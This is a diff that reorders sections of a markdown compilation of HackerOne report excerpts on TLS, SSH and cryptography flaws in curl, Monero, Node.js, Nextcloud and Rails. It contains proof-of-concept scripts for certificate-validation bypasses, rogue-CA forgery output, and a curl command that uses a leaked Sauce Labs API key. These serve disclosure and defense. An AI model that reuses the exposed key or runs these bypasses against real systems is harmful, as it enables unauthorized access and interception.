@@ -285,29 +285,6 @@ Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns lda
    
 ```
 
-## #2446531 Weak ssh algorithms and CVE-2023-48795 Discovered on various subdomains of nextcloud.com — nextcloud — - — Use of a Broken or Risky Cryptographic Algorithm
-Source: `hackerone/reports/2024/2446531.md` (https://hackerone.com/reports/2446531)
-
-```
-nmap --script ssh2-enum-algos target -sV -p- 
-
-# SSH-AUDIT 
-ssh-audit Target 
-
-https://www.sshaudit.com/
-```
-
-```
-    **Description:** SHA-1 is known to have several practical & exploitable weaknesses.
-```
-
-```
-    - ssh-rsa
-    - diffie-hellman-group14-sha1
-    - hmac-sha1-etm@openssh.com
-    - hmac-sha1
-```
-
 ## #3698862  `check_reserve_proof` sums RingCT ECDH amounts without checking the output commitment — monero — - — Missing Required Cryptographic Step
 Source: `hackerone/reports/2026/3698862.md` (https://hackerone.com/reports/3698862)
 
@@ -373,6 +350,29 @@ TEST(ringct, reserveProofStyleDecodeNeedsCommitmentCheck)
     std::runtime_error
   );
 }
+```
+
+## #2446531 Weak ssh algorithms and CVE-2023-48795 Discovered on various subdomains of nextcloud.com — nextcloud — - — Use of a Broken or Risky Cryptographic Algorithm
+Source: `hackerone/reports/2024/2446531.md` (https://hackerone.com/reports/2446531)
+
+```
+nmap --script ssh2-enum-algos target -sV -p- 
+
+# SSH-AUDIT 
+ssh-audit Target 
+
+https://www.sshaudit.com/
+```
+
+```
+    **Description:** SHA-1 is known to have several practical & exploitable weaknesses.
+```
+
+```
+    - ssh-rsa
+    - diffie-hellman-group14-sha1
+    - hmac-sha1-etm@openssh.com
+    - hmac-sha1
 ```
 
 ## #2669852 CVE-2024-8096: OCSP stapling bypass with GnuTLS — curl — - — Improper Certificate Validation
@@ -527,6 +527,30 @@ THROW_WALLET_EXCEPTION_IF(tx_hash != txid, error::wallet_internal_error,
 bash /home/beni/Monero/reports/poc_spend_proof_txid_substitution.sh
 ```
 
+## #3752567 curl GnuTLS backend accepts a clientAuth-only certificate for HTTPS server authentication — curl — - — Improper Certificate Validation
+Source: `hackerone/reports/2026/3752567.md` (https://hackerone.com/reports/3752567)
+
+```
+gnutls_certificate_set_verify_flags(creds,
+                                    GNUTLS_VERIFY_ALLOW_X509_V1_CA_CRT);
+```
+
+```
+int rc = gnutls_certificate_verify_peers2(session, &verify_status);
+...
+verified = !(verify_status & GNUTLS_CERT_INVALID);
+if(verified)
+  infof(data, "  SSL certificate verified by GnuTLS");
+```
+
+```
+rc = (int)gnutls_x509_crt_check_hostname(x509_cert,
+                                         peer->sni ? peer->sni :
+                                         peer->dest->hostname);
+result = (!rc && config->verifyhost) ?
+  CURLE_PEER_FAILED_VERIFICATION : CURLE_OK;
+```
+
 ## #3463949 Missing AES-GCM Authentication Tag Validation and Improper Deprecation Handling — nodejs — - — Missing Required Cryptographic Step
 Source: `hackerone/reports/2025/3463949.md` (https://hackerone.com/reports/3463949)
 
@@ -571,41 +595,6 @@ console.log('Decrypted with truncated tag: ' + decryptedPlaintext);
     - Requires rotation of the encryption keys
 ```
 
-## #3752567 curl GnuTLS backend accepts a clientAuth-only certificate for HTTPS server authentication — curl — - — Improper Certificate Validation
-Source: `hackerone/reports/2026/3752567.md` (https://hackerone.com/reports/3752567)
-
-```
-gnutls_certificate_set_verify_flags(creds,
-                                    GNUTLS_VERIFY_ALLOW_X509_V1_CA_CRT);
-```
-
-```
-int rc = gnutls_certificate_verify_peers2(session, &verify_status);
-...
-verified = !(verify_status & GNUTLS_CERT_INVALID);
-if(verified)
-  infof(data, "  SSL certificate verified by GnuTLS");
-```
-
-```
-rc = (int)gnutls_x509_crt_check_hostname(x509_cert,
-                                         peer->sni ? peer->sni :
-                                         peer->dest->hostname);
-result = (!rc && config->verifyhost) ?
-  CURLE_PEER_FAILED_VERIFICATION : CURLE_OK;
-```
-
-## #1302395 Sauce Labs API key unencrypted in an old commit — rails — - — Use of Hard-coded Cryptographic Key
-Source: `hackerone/reports/2024/1302395.md` (https://hackerone.com/reports/1302395)
-
-```
-curl https://rubyonrails:a035343f-e922-40b3-aa3c-06b3ea635c48@saucelabs.com/rest/v1/users/rubyonrails
-```
-
-```
-{"username": "rubyonrails", "vm_lockdown": false, "new_email": null, "last_name": null, "tunnels_lockdown": false, "parent": null, "team_management": true, "creation_time": 1462825877, "user_type": "floss (medium)", "monthly_minutes": {"manual": "infinite", "automated": "infinite"}, "prevent_emails": ["marketing"], "to_plan": null, "performance_enabled": false, "domain": null, "manual_minutes": "infinite", "can_run_manual": true, "concurrency_limit": {"mac": 15, "scout": 10, "overall": 10, "real_device": 0}, "is_public": true, "to_username": null, "id": "rubyonrails", "access_key": "a035343f-e922-40b3-aa3c-06b3ea635c48", "first_name": "Ruby on Rails", "verified": true, "name": null, "subscribed": false, "title": null, "ancestor_user_type": "floss (medium)", "terminating_subscription": false, "is_sso": false, "allow_integrations_page": true, "to_migration_status": null, "last_login": null, "ancestor_concurrency_limit": {"mac": 15, "scout": 10, "overall": 10, "real_device": 0}, "allowed_regions": ["us-west-1"], "require_full_name": false, "sso_alias": null, "ancestor": "rubyonrails", "minutes": "infinite", "email": "██████████", "to_migration_date": null}%
-```
-
 ## #3784125 GnuTLS OCSP stapling accepts unrelated SingleResponse (no cert-ID binding) — curl — - — Improper Certificate Validation
 Source: `hackerone/reports/2026/3784125.md` (https://hackerone.com/reports/3784125)
 
@@ -645,6 +634,17 @@ OCSPResponse {
         certStatus: revoked
       }
     ]
+```
+
+## #1302395 Sauce Labs API key unencrypted in an old commit — rails — - — Use of Hard-coded Cryptographic Key
+Source: `hackerone/reports/2024/1302395.md` (https://hackerone.com/reports/1302395)
+
+```
+curl https://rubyonrails:a035343f-e922-40b3-aa3c-06b3ea635c48@saucelabs.com/rest/v1/users/rubyonrails
+```
+
+```
+{"username": "rubyonrails", "vm_lockdown": false, "new_email": null, "last_name": null, "tunnels_lockdown": false, "parent": null, "team_management": true, "creation_time": 1462825877, "user_type": "floss (medium)", "monthly_minutes": {"manual": "infinite", "automated": "infinite"}, "prevent_emails": ["marketing"], "to_plan": null, "performance_enabled": false, "domain": null, "manual_minutes": "infinite", "can_run_manual": true, "concurrency_limit": {"mac": 15, "scout": 10, "overall": 10, "real_device": 0}, "is_public": true, "to_username": null, "id": "rubyonrails", "access_key": "a035343f-e922-40b3-aa3c-06b3ea635c48", "first_name": "Ruby on Rails", "verified": true, "name": null, "subscribed": false, "title": null, "ancestor_user_type": "floss (medium)", "terminating_subscription": false, "is_sso": false, "allow_integrations_page": true, "to_migration_status": null, "last_login": null, "ancestor_concurrency_limit": {"mac": 15, "scout": 10, "overall": 10, "real_device": 0}, "allowed_regions": ["us-west-1"], "require_full_name": false, "sso_alias": null, "ancestor": "rubyonrails", "minutes": "infinite", "email": "██████████", "to_migration_date": null}%
 ```
 
 ## #3574928 Able to bypass HSTS using trailing dot — curl — - — Missing Required Cryptographic Step
@@ -719,40 +719,6 @@ STEP 7: Forge cert for ████████
   Issuer:  CN=ATTACKER-ROGUE-CA,O=Malicious,C=XX
   Forged cert ACCEPTED by SSL context with rogue CA
   Signature verification: VALID -- forged cert is signed by rogue CA
-```
-
-## #3455037 Certificate Hostname Validation Bypass via Leading Dot in Hostname — curl — - — Improper Certificate Validation
-Source: `hackerone/reports/2025/3455037.md` (https://hackerone.com/reports/3455037)
-
-```
-#!/bin/bash
-CURL="${1:-curl}"
-PORT=9443
-
-cat > /tmp/san.cnf << 'EOF'
-[req]
-distinguished_name = req_distinguished_name
-x509_extensions = v3_req
-prompt = no
-[req_distinguished_name]
-CN = *.test.local
-[v3_req]
-subjectAltName = DNS:*.test.local
-EOF
-
-openssl req -x509 -newkey rsa:2048 -keyout /tmp/wc.key -out /tmp/wc.crt -days 1 -nodes -config /tmp/san.cnf 2>/dev/null
-
-fuser -k $PORT/tcp 2>/dev/null
-sleep 1
-
-openssl s_server -accept $PORT -cert /tmp/wc.crt -key /tmp/wc.key -www </dev/null >/dev/null 2>&1 &
-PID=$!
-sleep 2
-
-$CURL -v --max-time 5 --cacert /tmp/wc.crt --resolve ".test.local:$PORT:127.0.0.1" "https://.test.local:$PORT/" 2>&1
-
-kill $PID 2>/dev/null
-rm -f /tmp/san.cnf /tmp/wc.key /tmp/wc.crt
 ```
 
 ## #3739561 SSL session-cache peer key omits signature_algorithms: strict-sigalg handle silently resumes a permissive sibling's session — curl — - — Improper Certificate Validation
@@ -848,21 +814,45 @@ index 8ee14b66..17007b8b 100644
     !password_and_hashing(mysql, auth_plugin))
 ```
 
+## #3455037 Certificate Hostname Validation Bypass via Leading Dot in Hostname — curl — - — Improper Certificate Validation
+Source: `hackerone/reports/2025/3455037.md` (https://hackerone.com/reports/3455037)
+
+```
+#!/bin/bash
+CURL="${1:-curl}"
+PORT=9443
+
+cat > /tmp/san.cnf << 'EOF'
+[req]
+distinguished_name = req_distinguished_name
+x509_extensions = v3_req
+prompt = no
+[req_distinguished_name]
+CN = *.test.local
+[v3_req]
+subjectAltName = DNS:*.test.local
+EOF
+
+openssl req -x509 -newkey rsa:2048 -keyout /tmp/wc.key -out /tmp/wc.crt -days 1 -nodes -config /tmp/san.cnf 2>/dev/null
+
+fuser -k $PORT/tcp 2>/dev/null
+sleep 1
+
+openssl s_server -accept $PORT -cert /tmp/wc.crt -key /tmp/wc.key -www </dev/null >/dev/null 2>&1 &
+PID=$!
+sleep 2
+
+$CURL -v --max-time 5 --cacert /tmp/wc.crt --resolve ".test.local:$PORT:127.0.0.1" "https://.test.local:$PORT/" 2>&1
+
+kill $PID 2>/dev/null
+rm -f /tmp/san.cnf /tmp/wc.key /tmp/wc.crt
+```
+
 ## #713321 Exploiting Network and Timing Side-Channels to Break Monero Receiver Anonymity — monero — - — None
 Source: `hackerone/reports/2019/713321.md` (https://hackerone.com/reports/713321)
 
 ```
     - PoC within a report will most likely result in more bounty than not
-```
-
-## #3966955 TLS session cache case-folds CA paths and bypasses the active trust profile — curl — - — Improper Certificate Validation
-Source: `hackerone/reports/2026/3966955.md` (https://hackerone.com/reports/3966955)
-
-```
-    cert controls: good_rc=0 bad_rc=2
-    run1 case-only bad CA: rc=0 reused=True canary_sent=True http_200=2
-    run2 case-only bad CA: rc=0 reused=True canary_sent=True http_200=2
-    control different-name bad CA: rc=60 reused=False canary_sent=False http_200=1
 ```
 
 ## #746733 Remotely trigger an assertion on a TLS server with a malformed certificate string — nodejs — - — Improper Certificate Validation
@@ -937,6 +927,16 @@ ErCfVLYzVDrohIGYS4PMmypx1Bxhlg5JIyoR3JRUuQ==
 -----END CERTIFICATE-----
 ```
 
+## #3966955 TLS session cache case-folds CA paths and bypasses the active trust profile — curl — - — Improper Certificate Validation
+Source: `hackerone/reports/2026/3966955.md` (https://hackerone.com/reports/3966955)
+
+```
+    cert controls: good_rc=0 bad_rc=2
+    run1 case-only bad CA: rc=0 reused=True canary_sent=True http_200=2
+    run2 case-only bad CA: rc=0 reused=True canary_sent=True http_200=2
+    control different-name bad CA: rc=60 reused=False canary_sent=False http_200=1
+```
+
 ## #3295650 Exposure of Hard-coded Private Keys and Credentials in curl Source Repository (CWE-321) — curl — - — Use of Hard-coded Cryptographic Key
 Source: `hackerone/reports/2025/3295650.md` (https://hackerone.com/reports/3295650)
 
@@ -983,88 +983,6 @@ Source: `hackerone/reports/2018/387250.md` (https://hackerone.com/reports/387250
 ```
      assert_equal true, name0 == name1
      assert_equal true, name0.eql?(name1)
-```
-
-## #2961050 curl allows SSH connection even if host is not in known_hosts — curl — - — Improper Certificate Validation
-Source: `hackerone/reports/2025/2961050.md` (https://hackerone.com/reports/2961050)
-
-```
-              For SFTP and SCP, this option makes curl skip the known_hosts
-              verification.  known_hosts is a file normally stored in the
-              user's home directory in the ".ssh" subdirectory, which contains
-              hostnames and their public keys.
-```
-
-```
-$ curl --user foo sftp://localhost:2222
-Enter host password for user 'foo':
-Warning: Couldn't find a known_hosts file
-curl: (67) Login denied
-```
-
-```
-INFO:root:[pass] Authenticated username foo password bar
-```
-
-## #3418776 Silent TLS Trust Model Hijacking via `CURL_CA_BUNDLE` Environment Variable Leads to MITM — curl — - — Improper Certificate Validation
-Source: `hackerone/reports/2025/3418776.md` (https://hackerone.com/reports/3418776)
-
-```
-       * Login Credentials (Username, Password)
-       * API Keys and Authentication Tokens (Bearer Tokens)
-       * Session Cookies
-       * Personal and Financial Data
-       
-```
-
-## #2410774 CVE-2024-2379: QUIC certificate check bypass with wolfSSL — curl — - — Improper Certificate Validation
-Source: `hackerone/reports/2024/2410774.md` (https://hackerone.com/reports/2410774)
-
-```
-./curl -v --http3-only 'https://example.com/' -o /dev/null -s --resolve example.com:443:192.168.1.24 --curves blah
-* Added example.com:443:192.168.1.24 to DNS cache
-* Hostname example.com was found in DNS cache
-*   Trying 192.168.1.24:443...
-* wolfSSL failed to set curves
-* Verified certificate just fine
-* Connected to example.com (192.168.1.24) port 443
-* using HTTP/3
-* [HTTP/3] [0] OPENED stream for https://example.com/
-* [HTTP/3] [0] [:method: GET]
-* [HTTP/3] [0] [:scheme: https]
-* [HTTP/3] [0] [:authority: example.com]
-* [HTTP/3] [0] [:path: /]
-* [HTTP/3] [0] [user-agent: curl/8.7.0-DEV]
-* [HTTP/3] [0] [accept: */*]
-> GET / HTTP/3
-> Host: example.com
-> User-Agent: curl/8.7.0-DEV
-> Accept: */*
-> 
-* We are completely uploaded and fine
-< HTTP/3 200 
-< server: nginx/1.25.4
-< date: Sun, 10 Mar 2024 21:02:39 GMT
-< content-type: text/html
-< content-length: 615
-< last-modified: Wed, 14 Feb 2024 16:03:00 GMT
-< etag: "65cce434-267"
-< accept-ranges: bytes
-< 
-{ [615 bytes data]
-* Connection #0 to host example.com left intact
-```
-
-```
-./curl -v --http3-only 'https://example.com/' -o /dev/null -s --resolve example.com:443:192.168.1.24 
-* Added example.com:443:192.168.1.24 to DNS cache
-* Hostname example.com was found in DNS cache
-*   Trying 192.168.1.24:443...
-*  CAfile: /etc/ssl/certs/ca-certificates.crt
-*  CApath: none
-* QUIC connect to 192.168.1.24 port 443 failed: SSL peer certificate or SSH remote key was not OK
-* Failed to connect to example.com port 443 after 12 ms: SSL peer certificate or SSH remote key was not OK
-* Closing connection
 ```
 
 ## #3993973 HTTP Digest nonce reused across an https→http scheme change on the same handle — curl — - — None
@@ -1150,6 +1068,88 @@ int main(int argc, char **argv) {
 GET / HTTP/1.1
 Host: 127.0.0.1:18443
 Authorization: Digest username="alice", realm="testrealm", nonce="deadbeefcafe1234", uri="/", cnonce="...", nc=00000002, qop=auth, response="..."
+```
+
+## #2410774 CVE-2024-2379: QUIC certificate check bypass with wolfSSL — curl — - — Improper Certificate Validation
+Source: `hackerone/reports/2024/2410774.md` (https://hackerone.com/reports/2410774)
+
+```
+./curl -v --http3-only 'https://example.com/' -o /dev/null -s --resolve example.com:443:192.168.1.24 --curves blah
+* Added example.com:443:192.168.1.24 to DNS cache
+* Hostname example.com was found in DNS cache
+*   Trying 192.168.1.24:443...
+* wolfSSL failed to set curves
+* Verified certificate just fine
+* Connected to example.com (192.168.1.24) port 443
+* using HTTP/3
+* [HTTP/3] [0] OPENED stream for https://example.com/
+* [HTTP/3] [0] [:method: GET]
+* [HTTP/3] [0] [:scheme: https]
+* [HTTP/3] [0] [:authority: example.com]
+* [HTTP/3] [0] [:path: /]
+* [HTTP/3] [0] [user-agent: curl/8.7.0-DEV]
+* [HTTP/3] [0] [accept: */*]
+> GET / HTTP/3
+> Host: example.com
+> User-Agent: curl/8.7.0-DEV
+> Accept: */*
+> 
+* We are completely uploaded and fine
+< HTTP/3 200 
+< server: nginx/1.25.4
+< date: Sun, 10 Mar 2024 21:02:39 GMT
+< content-type: text/html
+< content-length: 615
+< last-modified: Wed, 14 Feb 2024 16:03:00 GMT
+< etag: "65cce434-267"
+< accept-ranges: bytes
+< 
+{ [615 bytes data]
+* Connection #0 to host example.com left intact
+```
+
+```
+./curl -v --http3-only 'https://example.com/' -o /dev/null -s --resolve example.com:443:192.168.1.24 
+* Added example.com:443:192.168.1.24 to DNS cache
+* Hostname example.com was found in DNS cache
+*   Trying 192.168.1.24:443...
+*  CAfile: /etc/ssl/certs/ca-certificates.crt
+*  CApath: none
+* QUIC connect to 192.168.1.24 port 443 failed: SSL peer certificate or SSH remote key was not OK
+* Failed to connect to example.com port 443 after 12 ms: SSL peer certificate or SSH remote key was not OK
+* Closing connection
+```
+
+## #2961050 curl allows SSH connection even if host is not in known_hosts — curl — - — Improper Certificate Validation
+Source: `hackerone/reports/2025/2961050.md` (https://hackerone.com/reports/2961050)
+
+```
+              For SFTP and SCP, this option makes curl skip the known_hosts
+              verification.  known_hosts is a file normally stored in the
+              user's home directory in the ".ssh" subdirectory, which contains
+              hostnames and their public keys.
+```
+
+```
+$ curl --user foo sftp://localhost:2222
+Enter host password for user 'foo':
+Warning: Couldn't find a known_hosts file
+curl: (67) Login denied
+```
+
+```
+INFO:root:[pass] Authenticated username foo password bar
+```
+
+## #3418776 Silent TLS Trust Model Hijacking via `CURL_CA_BUNDLE` Environment Variable Leads to MITM — curl — - — Improper Certificate Validation
+Source: `hackerone/reports/2025/3418776.md` (https://hackerone.com/reports/3418776)
+
+```
+       * Login Credentials (Username, Password)
+       * API Keys and Authentication Tokens (Bearer Tokens)
+       * Session Cookies
+       * Personal and Financial Data
+       
 ```
 
 ## #1699740 nextcloudcmd incorrectly trusts bad TLS certificates — nextcloud — - — Improper Certificate Validation
